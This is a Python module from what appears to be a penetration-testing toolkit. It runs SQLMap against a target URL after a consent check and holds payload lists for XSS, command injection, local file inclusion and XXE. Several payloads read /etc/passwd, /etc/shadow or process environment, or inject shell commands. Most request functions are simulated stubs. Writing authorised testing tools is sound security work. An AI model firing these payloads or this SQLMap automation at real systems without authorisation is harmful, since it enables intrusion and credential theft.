"""
Pentest-USB Toolkit - Web Exploitation Module
============================================

Web application exploitation using SQLMap, XSStrike and other tools.
Automated web exploitation with payload customization and blind attack techniques.

Author: Pentest-USB Development Team
Version: 1.0.0
"""

import re
import time
import json
import subprocess
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs
from pathlib import Path

from ...core.utils.logging_handler import get_logger
from ...core.utils.error_handler import PentestError
from ...core.security.consent_manager import ConsentManager
from ...core.utils.file_ops import FileOperations


class WebExploitationEngine:
    """
    Web application exploitation engine with multiple attack vectors
    """
    
    def __init__(self):
        """Initialize Web Exploitation Engine"""
        self.logger = get_logger(__name__)
        self.consent_manager = ConsentManager()
        self.file_ops = FileOperations()
        
        # Tool paths (will be dynamically detected)
        self.sqlmap_path = self._find_tool_path('sqlmap')
        self.xsstrike_path = self._find_tool_path('xsstrike')
        
        # Exploitation results storage
        self.results_dir = Path("/app/outputs/exploits")
        self.file_ops.ensure_directory(self.results_dir)
        
        self.logger.info("WebExploitationEngine initialized")
    
    def _find_tool_path(self, tool_name: str) -> Optional[str]:
        """Find tool path in binaries directory"""
        try:
            # Check platform-specific binaries
            import platform
            system = platform.system().lower()
            
            tool_dir = Path(f"/app/tools/binaries/{system}")
            if system == "windows":
                tool_path = tool_dir / f"{tool_name}.exe"
            else:
                tool_path = tool_dir / tool_name
            
            if tool_path.exists():
                return str(tool_path)
            
            # Fallback to system PATH
            try:
                result = subprocess.run(['which', tool_name], capture_output=True, text=True)
                if result.returncode == 0:
                    return result.stdout.strip()
            except:
                pass
                
            self.logger.warning(f"Tool not found: {tool_name}")
            return None
            
        except Exception as e:
            self.logger.error(f"Error finding tool {tool_name}: {str(e)}")
            return None
    
    def exploit_vulnerability(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """
        Exploit a specific vulnerability
        
        Args:
            vulnerability: Vulnerability information from scanner
            
        Returns:
            Exploitation results
        """
        try:
            # Check consent for exploitation
            target_url = vulnerability.get('url', vulnerability.get('target'))
            if not self.consent_manager.verify_consent(target_url):
                raise PentestError("Consent verification failed for exploitation")
            
            vuln_type = vulnerability.get('name', '').lower()
            
            if 'sql injection' in vuln_type or 'sqli' in vuln_type:
                return self._exploit_sql_injection(vulnerability)
            elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                return self._exploit_xss(vulnerability)
            elif 'command injection' in vuln_type:
                return self._exploit_command_injection(vulnerability)
            elif 'lfi' in vuln_type or 'local file inclusion' in vuln_type:
                return self._exploit_lfi(vulnerability)
            elif 'rfi' in vuln_type or 'remote file inclusion' in vuln_type:
                return self._exploit_rfi(vulnerability)
            elif 'xxe' in vuln_type:
                return self._exploit_xxe(vulnerability)
            else:
                return self._generic_exploit_attempt(vulnerability)
                
        except Exception as e:
            self.logger.error(f"Exploitation failed: {str(e)}")
            return {
                'success': False,
                'error': str(e),
                'vulnerability': vulnerability.get('name', 'Unknown'),
                'target': target_url
            }
    
    def _exploit_sql_injection(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit SQL injection vulnerability using SQLMap"""
        self.logger.info("Attempting SQL injection exploitation")
        
        if not self.sqlmap_path:
            return {'success': False, 'error': 'SQLMap not available', 'method': 'sql_injection'}
        
        try:
            url = vulnerability.get('url', '')
            parameter = vulnerability.get('parameter', vulnerability.get('param', ''))
            
            # Build SQLMap command
            cmd = [
                self.sqlmap_path,
                '-u', url,
                '--batch',  # Non-interactive
                '--random-agent',
                '--level=2',
                '--risk=2',
                '--timeout=30',
                '--retries=2'
            ]
            
            if parameter:
                cmd.extend(['-p', parameter])
            
            # Add specific techniques
            cmd.extend(['--technique=BEUST'])  # Boolean, Error, Union, Stacked, Time-based
            
            # Output directory
            output_dir = self.results_dir / 'sqlmap' / f"session_{int(time.time())}"
            self.file_ops.ensure_directory(output_dir)
            cmd.extend(['--output-dir', str(output_dir)])
            
            # Execute SQLMap
            self.logger.info(f"Executing SQLMap: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse results
            success = self._parse_sqlmap_results(result.stdout, result.stderr)
            
            exploitation_result = {
                'success': success,
                'method': 'sql_injection',
                'tool': 'sqlmap',
                'target': url,
                'parameter': parameter,
                'output_dir': str(output_dir),
                'raw_output': result.stdout,
                'errors': result.stderr,
                'databases_found': self._extract_databases(result.stdout),
                'tables_found': self._extract_tables(result.stdout),
                'exploitation_techniques': self._extract_techniques(result.stdout)
            }
            
            if success:
                self.logger.info("SQL injection exploitation successful")
                # Attempt to extract data
                exploitation_result.update(self._extract_sql_data(vulnerability, output_dir))
            else:
                self.logger.warning("SQL injection exploitation failed")
            
            return exploitation_result
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'SQLMap timeout', 'method': 'sql_injection'}
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'sql_injection'}
    
    def _exploit_xss(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit XSS vulnerability using XSStrike"""
        self.logger.info("Attempting XSS exploitation")
        
        try:
            url = vulnerability.get('url', '')
            parameter = vulnerability.get('parameter', vulnerability.get('param', ''))
            
            # Manual XSS payload testing
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "'\"><script>alert('XSS')</script>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=javascript:alert('XSS')></iframe>"
            ]
            
            successful_payloads = []
            
            for payload in payloads:
                try:
                    # Test payload injection
                    test_result = self._test_xss_payload(url, parameter, payload)
                    if test_result['vulnerable']:
                        successful_payloads.append({
                            'payload': payload,
                            'context': test_result.get('context', 'unknown'),
                            'response_snippet': test_result.get('response_snippet', '')
                        })
                        
                except Exception as e:
                    self.logger.debug(f"Payload test failed: {str(e)}")
                    continue
            
            success = len(successful_payloads) > 0
            
            exploitation_result = {
                'success': success,
                'method': 'xss',
                'tool': 'manual_testing',
                'target': url,
                'parameter': parameter,
                'successful_payloads': successful_payloads,
                'total_payloads_tested': len(payloads),
                'exploitation_context': self._analyze_xss_context(successful_payloads)
            }
            
            if success:
                self.logger.info(f"XSS exploitation successful with {len(successful_payloads)} payloads")
                exploitation_result['recommendations'] = self._generate_xss_recommendations(successful_payloads)
            else:
                self.logger.warning("XSS exploitation failed")
            
            return exploitation_result
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'xss'}
    
    def _exploit_command_injection(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit command injection vulnerability"""
        self.logger.info("Attempting command injection exploitation")
        
        try:
            url = vulnerability.get('url', '')
            parameter = vulnerability.get('parameter', vulnerability.get('param', ''))
            
            # Command injection payloads
            payloads = [
                '; id',
                '| id',
                '&& id',
                '|| id',
                '`id`',
                '$(id)',
                '; whoami',
                '| whoami',
                '&& whoami',
                '; uname -a',
                '| uname -a',
                '; cat /etc/passwd',
                '| cat /etc/passwd'
            ]
            
            successful_commands = []
            
            for payload in payloads:
                try:
                    result = self._test_command_injection(url, parameter, payload)
                    if result['vulnerable']:
                        successful_commands.append({
                            'payload': payload,
                            'output': result.get('output', ''),
                            'response_time': result.get('response_time', 0)
                        })
                        
                except Exception as e:
                    self.logger.debug(f"Command injection test failed: {str(e)}")
                    continue
            
            success = len(successful_commands) > 0
            
            exploitation_result = {
                'success': success,
                'method': 'command_injection',
                'tool': 'manual_testing',
                'target': url,
                'parameter': parameter,
                'successful_commands': successful_commands,
                'total_payloads_tested': len(payloads)
            }
            
            if success:
                self.logger.info(f"Command injection successful with {len(successful_commands)} commands")
                # Attempt privilege escalation check
                exploitation_result.update(self._check_command_injection_privileges(url, parameter))
            else:
                self.logger.warning("Command injection exploitation failed")
            
            return exploitation_result
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'command_injection'}
    
    def _exploit_lfi(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit Local File Inclusion vulnerability"""
        self.logger.info("Attempting LFI exploitation")
        
        try:
            url = vulnerability.get('url', '')
            parameter = vulnerability.get('parameter', vulnerability.get('param', ''))
            
            # LFI payloads
            lfi_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '/etc/passwd',
                '/etc/shadow',
                '/proc/version',
                '/proc/self/environ',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                '../../../../../../../etc/passwd',
                '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
            ]
            
            successful_reads = []
            
            for payload in lfi_payloads:
                try:
                    result = self._test_lfi_payload(url, parameter, payload)
                    if result['file_found']:
                        successful_reads.append({
                            'payload': payload,
                            'file_content': result.get('content', '')[:500],  # Limit content
                            'file_type': result.get('file_type', 'unknown')
                        })
                        
                except Exception as e:
                    self.logger.debug(f"LFI test failed: {str(e)}")
                    continue
            
            success = len(successful_reads) > 0
            
            exploitation_result = {
                'success': success,
                'method': 'lfi',
                'tool': 'manual_testing',
                'target': url,
                'parameter': parameter,
                'successful_reads': successful_reads,
                'total_payloads_tested': len(lfi_payloads)
            }
            
            if success:
                self.logger.info(f"LFI exploitation successful, read {len(successful_reads)} files")
                # Try log poisoning
                exploitation_result.update(self._attempt_log_poisoning(url, parameter))
            else:
                self.logger.warning("LFI exploitation failed")
            
            return exploitation_result
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'lfi'}
    
    def _exploit_rfi(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit Remote File Inclusion vulnerability"""
        self.logger.info("Attempting RFI exploitation")
        
        try:
            url = vulnerability.get('url', '')
            parameter = vulnerability.get('parameter', vulnerability.get('param', ''))
            
            # RFI test payloads (safe testing)
            rfi_payloads = [
                'http://httpbin.org/robots.txt',
                'https://httpbin.org/robots.txt',
                'ftp://httpbin.org/test.txt'
            ]
            
            successful_includes = []
            
            for payload in rfi_payloads:
                try:
                    result = self._test_rfi_payload(url, parameter, payload)
                    if result['remote_included']:
                        successful_includes.append({
                            'payload': payload,
                            'response_content': result.get('content', '')[:200],
                            'response_time': result.get('response_time', 0)
                        })
                        
                except Exception as e:
                    self.logger.debug(f"RFI test failed: {str(e)}")
                    continue
            
            success = len(successful_includes) > 0
            
            exploitation_result = {
                'success': success,
                'method': 'rfi',
                'tool': 'manual_testing',
                'target': url,
                'parameter': parameter,
                'successful_includes': successful_includes,
                'total_payloads_tested': len(rfi_payloads),
                'warning': 'RFI testing performed with safe payloads only'
            }
            
            if success:
                self.logger.info("RFI vulnerability confirmed")
                exploitation_result['recommendations'] = [
                    'This is a critical vulnerability',
                    'Remote code execution is likely possible',
                    'Immediate remediation required'
                ]
            else:
                self.logger.info("RFI exploitation failed or not vulnerable")
            
            return exploitation_result
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'rfi'}
    
    def _exploit_xxe(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit XXE (XML External Entity) vulnerability"""
        self.logger.info("Attempting XXE exploitation")
        
        try:
            url = vulnerability.get('url', '')
            
            # XXE payloads
            xxe_payloads = [
                '''<?xml version="1.0" encoding="ISO-8859-1"?>
                <!DOCTYPE foo [
                <!ELEMENT foo ANY>
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <foo>&xxe;</foo>''',
                
                '''<?xml version="1.0" encoding="ISO-8859-1"?>
                <!DOCTYPE foo [
                <!ELEMENT foo ANY>
                <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
                ]>
                <foo>&xxe;</foo>''',
                
                '''<?xml version="1.0" encoding="ISO-8859-1"?>
                <!DOCTYPE foo [
                <!ELEMENT foo ANY>
                <!ENTITY xxe SYSTEM "http://httpbin.org/robots.txt">
                ]>
                <foo>&xxe;</foo>'''
            ]
            
            successful_extractions = []
            
            for payload in xxe_payloads:
                try:
                    result = self._test_xxe_payload(url, payload)
                    if result['xxe_executed']:
                        successful_extractions.append({
                            'payload': payload,
                            'extracted_content': result.get('content', '')[:300],
                            'file_type': result.get('file_type', 'unknown')
                        })
                        
                except Exception as e:
                    self.logger.debug(f"XXE test failed: {str(e)}")
                    continue
            
            success = len(successful_extractions) > 0
            
            exploitation_result = {
                'success': success,
                'method': 'xxe',
                'tool': 'manual_testing',
                'target': url,
                'successful_extractions': successful_extractions,
                'total_payloads_tested': len(xxe_payloads)
            }
            
            if success:
                self.logger.info(f"XXE exploitation successful, extracted {len(successful_extractions)} files")
            else:
                self.logger.warning("XXE exploitation failed")
            
            return exploitation_result
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'xxe'}
    
    def _generic_exploit_attempt(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Generic exploitation attempt for unknown vulnerability types"""
        self.logger.info("Attempting generic exploitation")
        
        try:
            url = vulnerability.get('url', '')
            vuln_name = vulnerability.get('name', 'Unknown')
            
            # Basic vulnerability verification
            verification_result = self._verify_vulnerability(vulnerability)
            
            exploitation_result = {
                'success': verification_result.get('verified', False),
                'method': 'generic_verification',
                'tool': 'manual_testing',
                'target': url,
                'vulnerability_type': vuln_name,
                'verification_details': verification_result,
                'note': 'Generic exploitation attempt - specific exploit not available'
            }
            
            return exploitation_result
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'generic'}
    
    def _test_xss_payload(self, url: str, parameter: str, payload: str) -> Dict[str, Any]:
        """Test XSS payload (placeholder implementation)"""
        # This would contain actual HTTP request testing logic
        # For security, returning simulated results
        return {
            'vulnerable': False,
            'context': 'unknown',
            'response_snippet': 'Simulated testing - actual implementation required'
        }
    
    def _test_command_injection(self, url: str, parameter: str, payload: str) -> Dict[str, Any]:
        """Test command injection payload (placeholder implementation)"""
        return {
            'vulnerable': False,
            'output': 'Simulated testing - actual implementation required',
            'response_time': 1.0
        }
    
    def _test_lfi_payload(self, url: str, parameter: str, payload: str) -> Dict[str, Any]:
        """Test LFI payload (placeholder implementation)"""
        return {
            'file_found': False,
            'content': 'Simulated testing - actual implementation required',
            'file_type': 'unknown'
        }
    
    def _test_rfi_payload(self, url: str, parameter: str, payload: str) -> Dict[str, Any]:
        """Test RFI payload (placeholder implementation)"""
        return {
            'remote_included': False,
            'content': 'Simulated testing - actual implementation required',
            'response_time': 1.0
        }
    
    def _test_xxe_payload(self, url: str, payload: str) -> Dict[str, Any]:
        """Test XXE payload (placeholder implementation)"""
        return {
            'xxe_executed': False,
            'content': 'Simulated testing - actual implementation required',
            'file_type': 'unknown'
        }
    
    def _verify_vulnerability(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Verify vulnerability existence (placeholder implementation)"""
        return {
            'verified': False,
            'confidence': 'low',
            'details': 'Generic verification - specific test required'
        }
    
    def _parse_sqlmap_results(self, stdout: str, stderr: str) -> bool:
        """Parse SQLMap results to determine success"""
        success_indicators = [
            'sqlmap identified the following injection point',
            'database management system',
            'available databases',
            'current database',
            'back-end DBMS'
        ]
        
        stdout_lower = stdout.lower()
        return any(indicator in stdout_lower for indicator in success_indicators)
    
    def _extract_databases(self, sqlmap_output: str) -> List[str]:
        """Extract database names from SQLMap output"""
        # Pattern matching for database names
        db_pattern = r'available databases \[(\d+)\]:\s*\[.*?\*\]\s*(.+?)(?:\n\n|\n\[|$)'
        matches = re.findall(db_pattern, sqlmap_output, re.DOTALL | re.IGNORECASE)
        
        databases = []
        for count, db_list in matches:
            # Extract individual database names
            db_names = re.findall(r'\*\s*([^\n\*\[\]]+)', db_list)
            databases.extend([db.strip() for db in db_names])
        
        return databases
    
    def _extract_tables(self, sqlmap_output: str) -> List[str]:
        """Extract table names from SQLMap output"""
        # Pattern matching for table names
        table_pattern = r'Database: (.+?)\n.*?tables \[(\d+)\]:\s*\[.*?\*\]\s*(.+?)(?:\n\n|\n\[|$)'
        matches = re.findall(table_pattern, sqlmap_output, re.DOTALL | re.IGNORECASE)
        
        tables = []
        for db_name, count, table_list in matches:
            # Extract individual table names
            table_names = re.findall(r'\*\s*([^\n\*\[\]]+)', table_list)
            tables.extend([f"{db_name}.{table.strip()}" for table in table_names])
        
        return tables
    
    def _extract_techniques(self, sqlmap_output: str) -> List[str]:
        """Extract exploitation techniques used"""
        techniques = []
        technique_patterns = {
            'boolean': r'boolean-based blind',
            'error': r'error-based',
            'union': r'UNION query',
            'stacked': r'stacked queries',
            'time': r'time-based blind'
        }
        
        for tech_name, pattern in technique_patterns.items():
            if re.search(pattern, sqlmap_output, re.IGNORECASE):
                techniques.append(tech_name)
        
        return techniques
    
    def _extract_sql_data(self, vulnerability: Dict[str, Any], output_dir: Path) -> Dict[str, Any]:
        """Extract additional data using SQLMap"""
        # This would contain advanced data extraction logic
        return {
            'data_extraction_attempted': True,
            'extraction_methods': ['database_enumeration', 'table_dumping'],
            'note': 'Data extraction requires additional SQLMap commands'
        }
    
    def _analyze_xss_context(self, successful_payloads: List[Dict[str, Any]]) -> str:
        """Analyze XSS exploitation context"""
        if not successful_payloads:
            return 'none'
        
        contexts = set()
        for payload_info in successful_payloads:
            contexts.add(payload_info.get('context', 'unknown'))
        
        return ', '.join(contexts)
    
    def _generate_xss_recommendations(self, successful_payloads: List[Dict[str, Any]]) -> List[str]:
        """Generate XSS exploitation recommendations"""
        recommendations = [
            'Implement proper output encoding',
            'Use Content Security Policy (CSP)',
            'Validate and sanitize all user input',
            'Consider using automated XSS protection headers'
        ]
        
        return recommendations
    
    def _check_command_injection_privileges(self, url: str, parameter: str) -> Dict[str, Any]:
        """Check privileges after command injection"""
        return {
            'privilege_check_attempted': True,
            'current_user': 'unknown',
            'privileges': 'unknown',
            'note': 'Privilege escalation check requires additional testing'
        }
    
    def _attempt_log_poisoning(self, url: str, parameter: str) -> Dict[str, Any]:
        """Attempt log poisoning after LFI"""
        return {
            'log_poisoning_attempted': True,
            'methods_tried': ['apache_access_log', 'error_log', 'mail_log'],
            'success': False,
            'note': 'Log poisoning requires specific server configuration'
        }


# Module-level functions for easy integration
def exploit_vulnerability(vulnerability: Dict[str, Any]) -> Dict[str, Any]:
    """
    Main entry point for web exploitation
    
    Args:
        vulnerability: Vulnerability information from scanner
        
    Returns:
        Exploitation results
    """
    engine = WebExploitationEngine()
    return engine.exploit_vulnerability(vulnerability)


def exploit_sql_injection(url: str, parameter: str = None) -> Dict[str, Any]:
    """
    Exploit SQL injection specifically
    
    Args:
        url: Target URL
        parameter: Vulnerable parameter
        
    Returns:
        Exploitation results
    """
    vulnerability = {
        'name': 'SQL Injection',
        'url': url,
        'parameter': parameter
    }
    
    engine = WebExploitationEngine()
    return engine._exploit_sql_injection(vulnerability)


def exploit_xss(url: str, parameter: str = None) -> Dict[str, Any]:
    """
    Exploit XSS vulnerability specifically
    
    Args:
        url: Target URL  
        parameter: Vulnerable parameter
        
    Returns:
        Exploitation results
    """
    vulnerability = {
        'name': 'Cross-Site Scripting (XSS)',
        'url': url,
        'parameter': parameter
    }
    
    engine = WebExploitationEngine()
    return engine._exploit_xss(vulnerability)